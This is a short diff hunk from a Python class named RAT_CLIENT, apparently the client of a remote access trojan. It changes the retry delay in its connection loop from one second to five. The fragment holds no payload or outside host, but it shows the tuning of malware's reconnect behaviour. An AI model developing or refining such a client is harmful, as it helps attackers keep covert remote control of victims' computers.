@@ -55,7 +55,7 @@ class RAT_CLIENT:
                     print("Connect Establish")
             except socket.error as e:
                 print("Attempting to connect...")
-                time.sleep(1)
+                time.sleep(5)
             
     
     def errorsend(self):
